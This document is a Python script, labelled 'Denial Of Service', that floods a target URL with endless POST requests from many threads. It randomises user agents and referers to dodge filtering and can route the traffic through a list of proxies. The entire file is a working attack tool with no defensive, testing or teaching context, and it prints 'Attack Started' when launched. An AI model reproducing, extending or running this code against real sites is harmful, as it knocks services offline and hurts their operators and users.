#!/usr/bin/env python3
# Denial Of Service
import requests
import threading
import random
import re
import sys
import signal
import os
total_requests = 0
DEFAULT_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36 Edg/91.0.864.41',
]
DEFAULT_REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://duckduckgo.com/',
    'https://www.ask.com/',
]
def useragent_list():
    return random.choice(DEFAULT_USER_AGENTS)
def referer_list():
    return random.choice(DEFAULT_REFERERS)
def build_random_data():
    return {
        buildblock(random.randint(3, 10)): buildblock(random.randint(3, 10))
    }
def buildblock(size):
    return ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(size))
def usage():
    print('Usage --> ./ddos <url> <localhost/proxyfile> <threads> \n  threads arg is optional. (default=100)')
def httpcall(url, headers, proxy=None):
    global total_requests
    try:
        total_requests += 1
        print("Dos requests -> " + str(total_requests))
        response = requests.post(url, headers=headers, proxies=proxy)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        #print("Error:", e)
        pass
def attack_thread(url, headers, proxy, stop_event):
    while not stop_event.is_set():
        httpcall(url, headers, proxy)
if __name__ == '__main__':
    if len(sys.argv) <= 2:
        usage()
        sys.exit()
    def signal_handler(sig, frame):
        print('\nCtrl+C detected. Stopping...')
        stop_event.set()
        os._exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    url = sys.argv[1]
    if url.count("/") == 2:
        url = url + "/"
    m = re.search(r'http://([^/]*)/?.*', url)
    host = m.group(1)
    headers = {
        'User-Agent': useragent_list(),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': referer_list() + buildblock(random.randint(5, 10)),
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'keep-alive',
        'Host': host
    }
    if len(sys.argv) >= 4:
        num_threads = int(sys.argv[3])
    else:
        num_threads = 100
    proxyfile = sys.argv[2]
    if proxyfile != "localhost":
        with open(proxyfile) as f:
            ips = f.read().split('\n')
        proxies = [{'http': ip} for ip in ips]
    else:
        proxies = [None]
    print("-- Attack Started --")
    threads = []
    stop_event = threading.Event()
    for proxy in proxies:
        for _ in range(num_threads):
            t = threading.Thread(target=attack_thread, args=(url, headers, proxy, stop_event))
            t.start()
            threads.append(t)
    for t in threads:
        t.join()
